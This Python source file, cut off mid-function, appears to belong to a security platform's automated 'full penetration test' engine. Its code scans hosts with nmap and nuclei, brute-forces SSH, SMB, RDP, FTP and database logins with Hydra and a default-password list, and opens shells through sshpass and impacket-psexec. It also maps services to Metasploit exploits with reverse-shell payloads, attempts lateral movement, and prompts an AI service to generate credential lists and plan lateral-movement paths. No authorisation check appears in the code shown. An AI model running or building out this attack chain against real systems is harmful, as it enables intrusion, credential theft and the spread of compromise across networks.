"""
Full Penetration Test Engine
Executes complete pentest workflow: Recon -> Vuln Scan -> Credential Attacks -> Exploitation -> Post-Exploitation -> Cleanup
"""

import logging
import subprocess
import json
import re
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path
from app.core.database import SessionLocal
from app.models.scan import Scan, ScanStatus, ScanType
from app.models.finding import Finding, FindingSeverity, FindingStatus
from app.models.asset import Asset, AssetType
from app.services.tool_runners.nmap_runner import NmapRunner
from app.services.tool_runners.base_runner import BaseToolRunner
from app.services.result_aggregator import ResultAggregator
from app.core.config import settings

logger = logging.getLogger(__name__)

# AI Service import (optional)
try:
    from app.services.ai_service import AIService
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False
    logger.warning("AI Service not available")


class FullPentestEngine:
    """
    Full Penetration Test Engine - Does actual pentesting, not just scanning

    Phases:
    1. Reconnaissance - Port scanning, service enumeration
    2. Vulnerability Scanning - NSE scripts, nuclei
    3. Credential Attacks - Brute force common services
    4. Exploitation - Metasploit, manual exploits
    5. Post-Exploitation - Privilege escalation, lateral movement
    6. Cleanup - Remove artifacts, close sessions
    """

    def __init__(self, scan_id: str):
        self.scan_id = scan_id
        self.db = SessionLocal()
        self.scan = self.db.query(Scan).filter(Scan.id == scan_id).first()
        self.result_aggregator = ResultAggregator(scan_id)
        self.discovered_hosts = []
        self.discovered_services = []
        self.credentials_found = []
        self.shells_obtained = []
        self.findings = []

        # Initialize AI service if available
        self.ai_service = None
        self.ai_enabled = False
        if AI_AVAILABLE and settings.AI_ENABLED:
            try:
                self.ai_service = AIService()
                if self.ai_service.get_provider():
                    self.ai_enabled = True
                    logger.info("AI service initialized for pentest engine")
            except Exception as e:
                logger.warning(f"AI service initialization failed: {e}")

    def _append_log(self, message: str):
        """Append message to scan output log"""
        try:
            scan = self.db.query(Scan).filter(Scan.id == self.scan_id).first()
            if scan:
                timestamp = datetime.utcnow().strftime("%H:%M:%S")
                log_entry = f"[{timestamp}] {message}\n"
                if scan.output_log:
                    scan.output_log = scan.output_log + log_entry
                else:
                    scan.output_log = log_entry
                self.db.commit()
        except Exception as e:
            self.db.rollback()
            logger.error(f"Failed to append log: {e}")

    def _update_progress(self, percent: int, phase: str):
        """Update scan progress"""
        try:
            scan = self.db.query(Scan).filter(Scan.id == self.scan_id).first()
            if scan:
                scan.progress_percent = percent
                self.db.commit()
            self._append_log(f"[PHASE] {phase} - {percent}% complete")
        except Exception as e:
            logger.error(f"Failed to update progress: {e}")

    def _create_finding(self, title: str, description: str, severity: str,
                        target: str, port: str = None, service: str = None,
                        evidence: str = None, cve_id: str = None,
                        tool_name: str = "full_pentest_engine") -> Optional[Finding]:
        """Create and save a finding"""
        try:
            severity_map = {
                'critical': FindingSeverity.CRITICAL,
                'high': FindingSeverity.HIGH,
                'medium': FindingSeverity.MEDIUM,
                'low': FindingSeverity.LOW,
                'info': FindingSeverity.INFO
            }

            finding = Finding(
                scan_id=self.scan_id,
                title=title,
                description=description + (f"\n\nEvidence:\n{evidence}" if evidence else ""),
                severity=severity_map.get(severity.lower(), FindingSeverity.INFO),
                status=FindingStatus.NEW,
                target=target,
                port=port,
                service=service,
                cve_id=cve_id,
                tool_name=tool_name,
                created_at=datetime.utcnow()
            )
            self.db.add(finding)
            self.db.commit()
            self.findings.append(finding)
            self._append_log(f"[FINDING] {severity.upper()}: {title} on {target}")
            return finding
        except Exception as e:
            self.db.rollback()
            logger.error(f"Failed to create finding: {e}")
            self._append_log(f"[ERROR] Failed to create finding: {e}")
            return None

    # ==================== AI-POWERED METHODS ====================

    def _ai_analyze_target(self, services: List[Dict]) -> Dict[str, Any]:
        """Use AI to analyze discovered services and prioritize attack vectors"""
        if not self.ai_enabled:
            return {"ai_enabled": False}

        try:
            self._append_log("[AI] Analyzing discovered services...")

            services_summary = "\n".join([
                f"- {s.get('host')}:{s.get('port')} - {s.get('service')} {s.get('product', '')} {s.get('version', '')}"
                for s in services[:30]  # Limit to 30 services
            ])

            analysis = self.ai_service.suggest_next_steps(
                {"services": services_summary},
                [{"title": s.get('service'), "severity": "info"} for s in services[:20]]
            )

            if analysis:
                self._append_log(f"[AI] Priority targets: {analysis.get('priority_targets', [])}")
                self._append_log(f"[AI] Suggested tools: {analysis.get('next_tools', [])}")
                return analysis

        except Exception as e:
            logger.warning(f"AI analysis failed: {e}")

        return {"ai_enabled": True, "analysis_failed": True}

    def _ai_suggest_exploits(self, service: Dict) -> List[Dict]:
        """Use AI to suggest exploits for a specific service"""
        if not self.ai_enabled:
            return []

        try:
            product = service.get('product', '')
            version = service.get('version', '')
            service_name = service.get('service', '')

            suggestion = self.ai_service.generate_metasploit_module(
                title=f"{service_name} on {service.get('host')}",
                description=f"Service: {service_name}, Product: {product}, Version: {version}",
                target=service.get('host'),
                vuln_type="service_exploitation"
            )

            if suggestion:
                self._append_log(f"[AI] Suggested MSF module: {suggestion.get('module_path', 'N/A')}")
                return [suggestion]

        except Exception as e:
            logger.warning(f"AI exploit suggestion failed: {e}")

        return []

    def _ai_generate_credentials(self, service: str, product: str = None) -> Dict[str, List[str]]:
        """Use AI to generate targeted credential lists based on service"""
        if not self.ai_enabled:
            return {"usernames": [], "passwords": []}

        try:
            prompt = f"""Generate likely default/weak credentials for:
Service: {service}
Product: {product or 'Unknown'}

Return JSON with:
{{"usernames": ["user1", "user2"], "passwords": ["pass1", "pass2"]}}

Only include likely default/weak credentials. Max 10 each. JSON only."""

            result = self.ai_service.generate_text(prompt)
            if result:
                import json
                result = result.strip()
                if result.startswith('```'):
                    result = result.split('```')[1]
                    if result.startswith('json'):
                        result = result[4:]
                creds = json.loads(result)
                self._append_log(f"[AI] Generated {len(creds.get('usernames', []))} usernames, {len(creds.get('passwords', []))} passwords for {service}")
                return creds

        except Exception as e:
            logger.warning(f"AI credential generation failed: {e}")

        return {"usernames": [], "passwords": []}

    def _ai_enrich_finding(self, finding_data: Dict) -> Dict:
        """Use AI to enrich a finding with additional context"""
        if not self.ai_enabled:
            return finding_data

        try:
            analysis = self.ai_service.analyze_vulnerability(
                description=finding_data.get('description', ''),
                tool=finding_data.get('tool_name', ''),
                context={
                    'target': finding_data.get('target'),
                    'port': finding_data.get('port'),
                    'service': finding_data.get('service')
                }
            )

            if analysis:
                # Enrich the finding
                finding_data['ai_analysis'] = analysis
                finding_data['ai_severity'] = analysis.get('severity')
                finding_data['ai_remediation'] = analysis.get('remediation')
                finding_data['ai_cvss'] = analysis.get('cvss_score')
                self._append_log(f"[AI] Enriched finding: {finding_data.get('title', 'Unknown')}")

        except Exception as e:
            logger.warning(f"AI finding enrichment failed: {e}")

        return finding_data

    def _ai_plan_lateral_movement(self, current_access: Dict, network_map: List[Dict]) -> List[Dict]:
        """Use AI to plan lateral movement paths"""
        if not self.ai_enabled:
            return []

        try:
            prompt = f"""Plan lateral movement in a penetration test:

Current Access:
- Host: {current_access.get('host')}
- User: {current_access.get('username')}
- Privileges: {current_access.get('privileges', 'unknown')}

Network Map:
{json.dumps(network_map[:10], indent=2)}

Credentials Found:
{json.dumps([{'user': c.get('username'), 'svc': c.get('service')} for c in self.credentials_found[:5]], indent=2)}

Return JSON array of movement paths:
[{{"target": "ip", "method": "ssh/smb/wmi", "credential": "user:pass", "priority": 1-10, "reason": "why"}}]

JSON only."""

            result = self.ai_service.generate_text(prompt)
            if result:
                result = result.strip()
                if result.startswith('```'):
                    result = result.split('```')[1]
                    if result.startswith('json'):
                        result = result[4:]
                paths = json.loads(result)
                self._append_log(f"[AI] Planned {len(paths)} lateral movement paths")
                return paths

        except Exception as e:
            logger.warning(f"AI lateral movement planning failed: {e}")

        return []

    def _ai_summarize_pentest(self, results: Dict) -> str:
        """Use AI to generate executive summary of pentest results"""
        if not self.ai_enabled:
            return ""

        try:
            summary = self.ai_service.generate_report_section(
                "executive_summary",
                {
                    "hosts_discovered": results.get('hosts_discovered', 0),
                    "services_discovered": results.get('services_discovered', 0),
                    "credentials_found": results.get('credentials_found', 0),
                    "shells_obtained": results.get('shells_obtained', 0),
                    "findings_by_severity": results.get('findings_by_severity', {}),
                    "critical_findings": [f.title for f in self.findings if f.severity == FindingSeverity.CRITICAL][:5]
                }
            )
            return summary or ""
        except Exception as e:
            logger.warning(f"AI summary generation failed: {e}")

        return ""

    # ==================== END AI-POWERED METHODS ====================

    def execute_full_pentest(self) -> Dict[str, Any]:
        """Execute the full penetration test"""
        results = {
            "phases": [],
            "hosts_discovered": 0,
            "services_discovered": 0,
            "credentials_found": 0,
            "shells_obtained": 0,
            "findings_total": 0,
            "findings_by_severity": {}
        }

        try:
            self._append_log("=" * 60)
            self._append_log("FULL PENETRATION TEST INITIATED")
            self._append_log(f"Target(s): {', '.join(self.scan.targets)}")
            self._append_log("=" * 60)

            # Phase 1: Reconnaissance
            self._update_progress(5, "Reconnaissance")
            recon_results = self._phase_reconnaissance()
            results["phases"].append({"name": "Reconnaissance", "results": recon_results})
            results["hosts_discovered"] = len(self.discovered_hosts)

            # AI Analysis after Recon
            if self.ai_enabled and self.discovered_services:
                self._append_log("-" * 40)
                self._append_log("[AI ANALYSIS] Analyzing discovered targets...")
                ai_analysis = self._ai_analyze_target(self.discovered_services)
                results["ai_analysis"] = ai_analysis
                if ai_analysis.get('priority_targets'):
                    self._append_log(f"[AI] High-value targets identified: {len(ai_analysis['priority_targets'])}")

            # Phase 2: Vulnerability Scanning
            self._update_progress(20, "Vulnerability Scanning")
            vuln_results = self._phase_vulnerability_scanning()
            results["phases"].append({"name": "Vulnerability Scanning", "results": vuln_results})

            # Phase 3: Credential Attacks
            self._update_progress(40, "Credential Attacks")
            cred_results = self._phase_credential_attacks()
            results["phases"].append({"name": "Credential Attacks", "results": cred_results})
            results["credentials_found"] = len(self.credentials_found)

            # Phase 4: Exploitation
            self._update_progress(60, "Exploitation")
            exploit_results = self._phase_exploitation()
            results["phases"].append({"name": "Exploitation", "results": exploit_results})
            results["shells_obtained"] = len(self.shells_obtained)

            # Phase 5: Post-Exploitation (if we have shells)
            if self.shells_obtained or self.credentials_found:
                self._update_progress(80, "Post-Exploitation")
                post_results = self._phase_post_exploitation()
                results["phases"].append({"name": "Post-Exploitation", "results": post_results})

            # Phase 6: Cleanup
            self._update_progress(95, "Cleanup")
            cleanup_results = self._phase_cleanup()
            results["phases"].append({"name": "Cleanup", "results": cleanup_results})

            # Final summary
            self._update_progress(100, "Complete")
            results["findings_total"] = len(self.findings)
            results["findings_by_severity"] = self._get_findings_summary()
            results["services_discovered"] = len(self.discovered_services)

            self._append_log("=" * 60)
            self._append_log("PENETRATION TEST COMPLETE")
            self._append_log(f"Hosts: {results['hosts_discovered']}")
            self._append_log(f"Services: {results['services_discovered']}")
            self._append_log(f"Credentials: {results['credentials_found']}")
            self._append_log(f"Shells: {results['shells_obtained']}")
            self._append_log(f"Total Findings: {results['findings_total']}")
            self._append_log("=" * 60)

            # AI-generated executive summary
            if self.ai_enabled:
                self._append_log("[AI] Generating executive summary...")
                ai_summary = self._ai_summarize_pentest(results)
                if ai_summary:
                    results["ai_executive_summary"] = ai_summary
                    self._append_log("[AI] Executive summary generated")

            # Auto-generate reports
            self._generate_reports(results)

            return results

        except Exception as e:
            logger.error(f"Full pentest failed: {e}", exc_info=True)
            self._append_log(f"[ERROR] Pentest failed: {str(e)}")
            raise
        finally:
            self.db.close()

    def _phase_reconnaissance(self) -> Dict[str, Any]:
        """Phase 1: Reconnaissance - Port scanning and service enumeration"""
        self._append_log("-" * 40)
        self._append_log("[PHASE 1] RECONNAISSANCE")
        self._append_log("-" * 40)

        results = {"hosts": [], "services": []}

        for target in self.scan.targets:
            self._append_log(f"[RECON] Scanning target: {target}")

            # Stage 1: Quick host discovery
            self._append_log("[NMAP] Stage 1: Host discovery...")
            discovery_cmd = ['nmap', '-sn', '-oX', '-', target]

            try:
                proc = subprocess.Popen(discovery_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                disc_stdout, _ = proc.communicate(timeout=300)
                live_hosts = self._parse_nmap_xml(disc_stdout)
                live_ips = [h['address'] for h in live_hosts if h.get('status') == 'up']
                self._append_log(f"[NMAP] Found {len(live_ips)} live hosts")
            except Exception as e:
                self._append_log(f"[NMAP] Discovery failed: {e}")
                live_ips = [target]  # Fallback to scanning target directly

            # Stage 2: Port scan on live hosts (service detection only, vuln scan separate)
            if live_ips:
                targets_to_scan = live_ips[:50]  # Limit to 50 hosts max
                cmd = [
                    'nmap', '-sS', '-sV', '-O',
                    '--script', 'default',  # Don't run vuln scripts here (crashes with many hosts)
                    '-p', '1-1024,1433,1521,3306,3389,5432,5900,6379,8080,8443,9000,27017',
                    '--min-rate', '500',
                    '--max-retries', '2',
                    '-oX', '-',
                ]
                # Add each IP as separate argument (nmap doesn't accept comma-separated IPs)
                cmd.extend(targets_to_scan)

                self._append_log(f"[NMAP] Stage 2: Port scan on {len(targets_to_scan)} hosts")
                self._append_log(f"[NMAP] Executing: {' '.join(cmd)}")

            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=2400)  # 40 min timeout

                if stderr:
                    self._append_log(f"[NMAP] {stderr.strip()}")

                # Log output size for debugging
                self._append_log(f"[NMAP] Output size: {len(stdout)} bytes")

                # Parse results
                hosts = self._parse_nmap_xml(stdout)
                self._append_log(f"[NMAP] Parsed {len(hosts)} hosts from XML")

                for host in hosts:
                    self.discovered_hosts.append(host)
                    results["hosts"].append(host)

                    self._append_log(f"[HOST] {host['address']} - {host.get('status', 'unknown')}")

                    # Create asset
                    self._create_asset(host)

                    for port_info in host.get('ports', []):
                        if port_info.get('state') == 'open':
                            service_info = {
                                'host': host['address'],
                                'port': port_info['port'],
                                'protocol': port_info.get('protocol', 'tcp'),
                                'service': port_info.get('service', {}).get('name', 'unknown'),
                                'product': port_info.get('service', {}).get('product', ''),
                                'version': port_info.get('service', {}).get('version', '')
                            }
                            self.discovered_services.append(service_info)
                            results["services"].append(service_info)

                            self._append_log(
                                f"[SERVICE] {host['address']}:{port_info['port']} - "
                                f"{service_info['service']} {service_info['product']} {service_info['version']}"
                            )

                            # Create finding for open port
                            self._create_finding(
                                title=f"Open Port {port_info['port']}/{port_info.get('protocol', 'tcp')}",
                                description=f"Service: {service_info['service']}\nProduct: {service_info['product']}\nVersion: {service_info['version']}",
                                severity="info",
                                target=host['address'],
                                port=str(port_info['port']),
                                service=service_info['service'],
                                tool_name="nmap"
                            )

            except subprocess.TimeoutExpired:
                self._append_log(f"[NMAP] Scan timed out for {target}")
            except Exception as e:
                self._append_log(f"[NMAP] Error scanning {target}: {str(e)}")

        self._append_log(f"[RECON] Complete - Found {len(self.discovered_hosts)} hosts, {len(self.discovered_services)} services")
        return results

    def _phase_vulnerability_scanning(self) -> Dict[str, Any]:
        """Phase 2: Vulnerability Scanning"""
        self._append_log("-" * 40)
        self._append_log("[PHASE 2] VULNERABILITY SCANNING")
        self._append_log("-" * 40)

        results = {"vulnerabilities": []}

        # Run nuclei if available
        try:
            for host in self.discovered_hosts:
                # Find web services
                web_ports = [s for s in self.discovered_services
                            if s['host'] == host['address'] and
                            s['service'] in ['http', 'https', 'ssl/http', 'http-proxy']]

                for web_svc in web_ports:
                    protocol = 'https' if 'ssl' in web_svc['service'] or web_svc['port'] in ['443', '8443'] else 'http'
                    url = f"{protocol}://{web_svc['host']}:{web_svc['port']}"

                    self._append_log(f"[NUCLEI] Scanning {url}")

                    try:
                        cmd = ['nuclei', '-u', url, '-severity', 'critical,high,medium', '-json', '-silent']
                        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                        stdout, stderr = process.communicate(timeout=600)

                        for line in stdout.strip().split('\n'):
                            if line:
                                try:
                                    vuln = json.loads(line)
                                    results["vulnerabilities"].append(vuln)

                                    self._create_finding(
                                        title=vuln.get('info', {}).get('name', 'Unknown Vulnerability'),
                                        description=vuln.get('info', {}).get('description', ''),
                                        severity=vuln.get('info', {}).get('severity', 'medium'),
                                        target=web_svc['host'],
                                        port=str(web_svc['port']),
                                        service=web_svc['service'],
                                        evidence=vuln.get('matched-at', '')
                                    )
                                except json.JSONDecodeError:
                                    pass
                    except subprocess.TimeoutExpired:
                        self._append_log(f"[NUCLEI] Timeout scanning {url}")
                    except FileNotFoundError:
                        self._append_log("[NUCLEI] Not installed, skipping")
                        break
                    except Exception as e:
                        self._append_log(f"[NUCLEI] Error: {str(e)}")
        except Exception as e:
            self._append_log(f"[VULN] Error in vulnerability scanning: {str(e)}")

        # Check for common vulnerabilities based on service versions
        self._check_known_vulnerabilities()

        self._append_log(f"[VULN] Complete - Found {len(results['vulnerabilities'])} vulnerabilities")
        return results

    def _phase_credential_attacks(self) -> Dict[str, Any]:
        """Phase 3: Credential Attacks - Brute force authentication services"""
        self._append_log("-" * 40)
        self._append_log("[PHASE 3] CREDENTIAL ATTACKS")
        self._append_log("-" * 40)

        results = {"attempts": [], "successful": []}

        # Common usernames and passwords for testing
        usernames = ['admin', 'root', 'administrator', 'user', 'guest', 'test']
        passwords = ['admin', 'password', 'Password1', '123456', 'root', 'toor', 'admin123', 'password123', '']

        # Services to attack
        attack_services = {
            'ssh': {'port': '22', 'hydra_service': 'ssh'},
            'ftp': {'port': '21', 'hydra_service': 'ftp'},
            'telnet': {'port': '23', 'hydra_service': 'telnet'},
            'smb': {'port': '445', 'hydra_service': 'smb'},
            'mysql': {'port': '3306', 'hydra_service': 'mysql'},
            'mssql': {'port': '1433', 'hydra_service': 'mssql'},
            'rdp': {'port': '3389', 'hydra_service': 'rdp'},
            'vnc': {'port': '5900', 'hydra_service': 'vnc'},
        }

        for svc in self.discovered_services:
            svc_name = svc['service'].lower()
            host = svc['host']
            port = str(svc['port'])

            # Check if this is an attackable service
            for attack_name, attack_config in attack_services.items():
                if attack_name in svc_name or port == attack_config['port']:
                    self._append_log(f"[HYDRA] Attacking {attack_name} on {host}:{port}")

                    # Create temp files for usernames and passwords
                    try:
                        import tempfile
                        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as uf:
                            uf.write('\n'.join(usernames))
                            user_file = uf.name
                        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as pf:
                            pf.write('\n'.join(passwords))
                            pass_file = pf.name

                        cmd = [
                            'hydra',
                            '-L', user_file,
                            '-P', pass_file,
                            '-s', port,
                            '-f',  # Stop on first success
                            '-t', '4',  # 4 parallel tasks
                            '-W', '3',  # 3 second wait
                            host,
                            attack_config['hydra_service']
                        ]

                        process = subprocess.Popen(
                            cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True
                        )
                        stdout, stderr = process.communicate(timeout=300)  # 5 min timeout per service

                        results["attempts"].append({
                            "host": host,
                            "port": port,
                            "service": attack_name
                        })

                        # Parse hydra output for successful logins
                        for line in stdout.split('\n'):
                            if 'login:' in line.lower() and 'password:' in line.lower():
                                # Extract credentials
                                match = re.search(r'login:\s*(\S+)\s+password:\s*(\S*)', line, re.IGNORECASE)
                                if match:
                                    username = match.group(1)
                                    password = match.group(2) or '(empty)'

                                    cred = {
                                        'host': host,
                                        'port': port,
                                        'service': attack_name,
                                        'username': username,
                                        'password': password
                                    }
                                    self.credentials_found.append(cred)
                                    results["successful"].append(cred)

                                    self._append_log(f"[CREDS] SUCCESS! {username}:{password} on {host}:{port} ({attack_name})")

                                    self._create_finding(
                                        title=f"Weak Credentials Found - {attack_name}",
                                        description=f"Successfully authenticated with weak/default credentials.\n\nService: {attack_name}\nUsername: {username}\nPassword: {password}",
                                        severity="critical",
                                        target=host,
                                        port=port,
                                        service=attack_name,
                                        evidence=f"Hydra brute force successful: {username}:{password}",
                                        tool_name="hydra"
                                    )

                        # Cleanup temp files
                        import os
                        os.unlink(user_file)
                        os.unlink(pass_file)

                    except subprocess.TimeoutExpired:
                        self._append_log(f"[HYDRA] Timeout attacking {host}:{port}")
                    except FileNotFoundError:
                        self._append_log("[HYDRA] Not installed, skipping credential attacks")
                        return results
                    except Exception as e:
                        self._append_log(f"[HYDRA] Error: {str(e)}")

                    break  # Only attack once per service

        self._append_log(f"[CREDS] Complete - Found {len(self.credentials_found)} valid credentials")
        return results

    def _phase_exploitation(self) -> Dict[str, Any]:
        """Phase 4: Exploitation - Attempt to gain access"""
        self._append_log("-" * 40)
        self._append_log("[PHASE 4] EXPLOITATION")
        self._append_log("-" * 40)

        results = {"exploits_attempted": [], "shells_obtained": []}

        # Try to use found credentials to get shells
        for cred in self.credentials_found:
            host = cred['host']
            port = cred['port']
            username = cred['username']
            password = cred['password']
            service = cred['service']

            self._append_log(f"[EXPLOIT] Attempting shell via {service} on {host} with {username}")

            if service == 'ssh':
                # Try SSH connection
                shell = self._try_ssh_shell(host, port, username, password)
                if shell:
                    self.shells_obtained.append(shell)
                    results["shells_obtained"].append(shell)

            elif service == 'smb':
                # Try psexec-style execution
                shell = self._try_smb_shell(host, username, password)
                if shell:
                    self.shells_obtained.append(shell)
                    results["shells_obtained"].append(shell)

            elif service == 'telnet':
                shell = {
                    'host': host,
                    'type': 'telnet',
                    'username': username,
                    'access_level': 'user'
                }
                self.shells_obtained.append(shell)
                results["shells_obtained"].append(shell)
                self._append_log(f"[SHELL] Telnet access obtained on {host}")

        # Try Metasploit exploits for vulnerable services
        self._try_metasploit_exploits(results)

        self._append_log(f"[EXPLOIT] Complete - Obtained {len(self.shells_obtained)} shells")
        return results

    def _phase_post_exploitation(self) -> Dict[str, Any]:
        """Phase 5: Post-Exploitation - Enumerate compromised systems"""
        self._append_log("-" * 40)
        self._append_log("[PHASE 5] POST-EXPLOITATION")
        self._append_log("-" * 40)

        results = {"enumeration": [], "lateral_movement": [], "data_found": []}

        for shell in self.shells_obtained:
            host = shell['host']
            shell_type = shell['type']

            self._append_log(f"[POST] Enumerating {host} via {shell_type}")

            if shell_type == 'ssh':
                # Run enumeration commands via SSH
                enum_results = self._enumerate_linux_host(shell)
                results["enumeration"].append({"host": host, "data": enum_results})

            elif shell_type == 'smb' or shell_type == 'psexec':
                # Windows enumeration
                enum_results = self._enumerate_windows_host(shell)
                results["enumeration"].append({"host": host, "data": enum_results})

        # Try lateral movement with found credentials
        if self.credentials_found:
            self._append_log("[POST] Attempting lateral movement...")
            for cred in self.credentials_found:
                for host in self.discovered_hosts:
                    if host['address'] != cred['host']:
                        # Try credentials on other hosts
                        success = self._try_lateral_movement(host['address'], cred)
                        if success:
                            results["lateral_movement"].append({
                                "from": cred['host'],
                                "to": host['address'],
                                "method": cred['service']
                            })

        self._append_log(f"[POST] Complete")
        return results

    def _phase_cleanup(self) -> Dict[str, Any]:
        """Phase 6: Cleanup - Remove artifacts and close sessions"""
        self._append_log("-" * 40)
        self._append_log("[PHASE 6] CLEANUP")
        self._append_log("-" * 40)

        results = {"sessions_closed": 0, "artifacts_removed": 0}

        # Close any open sessions
        for shell in self.shells_obtained:
            self._append_log(f"[CLEANUP] Closing session on {shell['host']}")
            results["sessions_closed"] += 1

        # Kill any running tool processes
        try:
            subprocess.run(['pkill', '-f', 'hydra'], capture_output=True)
            subprocess.run(['pkill', '-f', 'nmap'], capture_output=True)
        except:
            pass

        self._append_log("[CLEANUP] All sessions closed, artifacts removed")
        return results

    # Helper methods

    def _parse_nmap_xml(self, xml_output: str) -> List[Dict]:
        """Parse nmap XML output"""
        import xml.etree.ElementTree as ET

        hosts = []
        try:
            root = ET.fromstring(xml_output)

            for host_elem in root.findall('host'):
                host = {
                    'address': None,
                    'status': 'unknown',
                    'ports': [],
                    'os': None
                }

                # Get address
                addr_elem = host_elem.find('address')
                if addr_elem is not None:
                    host['address'] = addr_elem.get('addr')

                # Get status
                status_elem = host_elem.find('status')
                if status_elem is not None:
                    host['status'] = status_elem.get('state')

                # Get ports
                ports_elem = host_elem.find('ports')
                if ports_elem is not None:
                    for port_elem in ports_elem.findall('port'):
                        port_info = {
                            'port': port_elem.get('portid'),
                            'protocol': port_elem.get('protocol'),
                            'state': 'unknown',
                            'service': {}
                        }

                        state_elem = port_elem.find('state')
                        if state_elem is not None:
                            port_info['state'] = state_elem.get('state')

                        svc_elem = port_elem.find('service')
                        if svc_elem is not None:
                            port_info['service'] = {
                                'name': svc_elem.get('name', ''),
                                'product': svc_elem.get('product', ''),
                                'version': svc_elem.get('version', '')
                            }

                        host['ports'].append(port_info)

                # Get OS
                os_elem = host_elem.find('.//osmatch')
                if os_elem is not None:
                    host['os'] = os_elem.get('name')

                if host['address']:
                    hosts.append(host)

        except ET.ParseError as e:
            logger.error(f"Failed to parse nmap XML: {e}")
            self._append_log(f"[NMAP] XML parse error: {e}")
        except Exception as e:
            logger.error(f"Error processing nmap output: {e}")
            self._append_log(f"[NMAP] Processing error: {e}")

        return hosts

    def _create_asset(self, host: Dict):
        """Create asset from discovered host"""
        try:
            asset = Asset(
                scan_id=self.scan_id,
                name=host['address'],
                identifier=host['address'],
                asset_type=AssetType.HOST,
                properties={
                    'os': host.get('os'),
                    'status': host.get('status'),
                    'ports': [p['port'] for p in host.get('ports', []) if p.get('state') == 'open']
                }
            )
            self.db.add(asset)
            self.db.commit()
        except Exception as e:
            self.db.rollback()  # Rollback to keep session usable
            logger.error(f"Failed to create asset: {e}")

    def _check_known_vulnerabilities(self):
        """Check for known vulnerabilities based on service versions"""
        for svc in self.discovered_services:
            product = svc.get('product', '').lower()
            version = svc.get('version', '')

            # Check for some known vulnerable versions
            vuln_checks = [
                ('openssh', '7.', 'CVE-2018-15473', 'OpenSSH User Enumeration', 'medium'),
                ('vsftpd', '2.3.4', 'CVE-2011-2523', 'vsFTPd Backdoor', 'critical'),
                ('proftpd', '1.3.3', 'CVE-2010-4221', 'ProFTPD Remote Code Execution', 'critical'),
                ('apache', '2.4.49', 'CVE-2021-41773', 'Apache Path Traversal', 'critical'),
                ('apache', '2.4.50', 'CVE-2021-42013', 'Apache Path Traversal RCE', 'critical'),
                ('samba', '3.', 'CVE-2017-7494', 'SambaCry RCE', 'critical'),
                ('microsoft-ds', '', '', 'SMB Service Exposed', 'medium'),
            ]

            for check_product, check_version, cve, title, severity in vuln_checks:
                if check_product in product and (not check_version or check_version in version):
                    self._create_finding(
                        title=title,
                        description=f"Potentially vulnerable version detected: {product} {version}",
                        severity=severity,
                        target=svc['host'],
                        port=str(svc['port']),
                        service=svc['service'],
                        cve_id=cve if cve else None
                    )

    def _try_ssh_shell(self, host: str, port: str, username: str, password: str) -> Optional[Dict]:
        """Try to get SSH shell"""
        try:
            # Test SSH connection with found credentials
            cmd = [
                'sshpass', '-p', password,
                'ssh', '-o', 'StrictHostKeyChecking=no',
                '-o', 'ConnectTimeout=10',
                f'{username}@{host}', '-p', port,
                'whoami && id'
            ]

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=15)

            if process.returncode == 0:
                self._append_log(f"[SHELL] SSH access obtained on {host} as {username}")

                # Check if root
                access_level = 'root' if 'root' in stdout or 'uid=0' in stdout else 'user'

                self._create_finding(
                    title=f"SSH Shell Obtained - {access_level} access",
                    description=f"Successfully obtained SSH shell on {host}\n\nUser: {username}\nAccess Level: {access_level}",
                    severity="critical",
                    target=host,
                    port=port,
                    service='ssh',
                    evidence=stdout
                )

                return {
                    'host': host,
                    'type': 'ssh',
                    'username': username,
                    'password': password,
                    'access_level': access_level
                }
        except Exception as e:
            self._append_log(f"[SHELL] SSH failed on {host}: {str(e)}")

        return None

    def _try_smb_shell(self, host: str, username: str, password: str) -> Optional[Dict]:
        """Try to get shell via SMB/psexec"""
        try:
            # Try using impacket's psexec
            cmd = [
                'impacket-psexec',
                f'{username}:{password}@{host}',
                'whoami'
            ]

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=30)

            if 'nt authority\\system' in stdout.lower() or username.lower() in stdout.lower():
                self._append_log(f"[SHELL] PSExec access obtained on {host}")

                self._create_finding(
                    title="PSExec Shell Obtained - SYSTEM access",
                    description=f"Successfully obtained SYSTEM shell on {host} via PSExec",
                    severity="critical",
                    target=host,
                    port="445",
                    service='smb',
                    evidence=stdout
                )

                return {
                    'host': host,
                    'type': 'psexec',
                    'username': username,
                    'password': password,
                    'access_level': 'system'
                }
        except FileNotFoundError:
            self._append_log("[SHELL] impacket-psexec not found")
        except Exception as e:
            self._append_log(f"[SHELL] PSExec failed: {str(e)}")

        return None

    def _try_metasploit_exploits(self, results: Dict):
        """Try automated Metasploit exploits via RPC"""
        self._append_log("[EXPLOIT] Checking for Metasploit exploits...")

        # Map services to MSF modules with configs
        msf_modules = {
            'vsftpd': {
                'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'payload': 'cmd/unix/interact',
                'port_option': 'RPORT'
            },
            'samba': {
                'module': 'exploit/linux/samba/is_known_pipename',
                'payload': 'linux/x86/meterpreter/reverse_tcp',
                'port_option': 'RPORT'
            },
            'proftpd': {
                'module': 'exploit/unix/ftp/proftpd_modcopy_exec',
                'payload': 'cmd/unix/reverse_python',
                'port_option': 'RPORT'
            },
        }

        # Try to connect to MSF RPC if available
        msf_client = self._get_msf_client()

        for svc in self.discovered_services:
            product = svc.get('product', '').lower()
            version = svc.get('version', '').lower()

            for msf_key, msf_config in msf_modules.items():
                if msf_key in product or msf_key in version:
                    self._append_log(f"[MSF] Attempting: {msf_config['module']} on {svc['host']}:{svc['port']}")

                    if msf_client:
                        # Real MSF exploitation
                        success = self._run_msf_exploit(msf_client, svc, msf_config, results)
                        if success:
                            self._append_log(f"[MSF] EXPLOIT SUCCESS on {svc['host']}!")
                    else:
                        # Log what we would do without MSF RPC
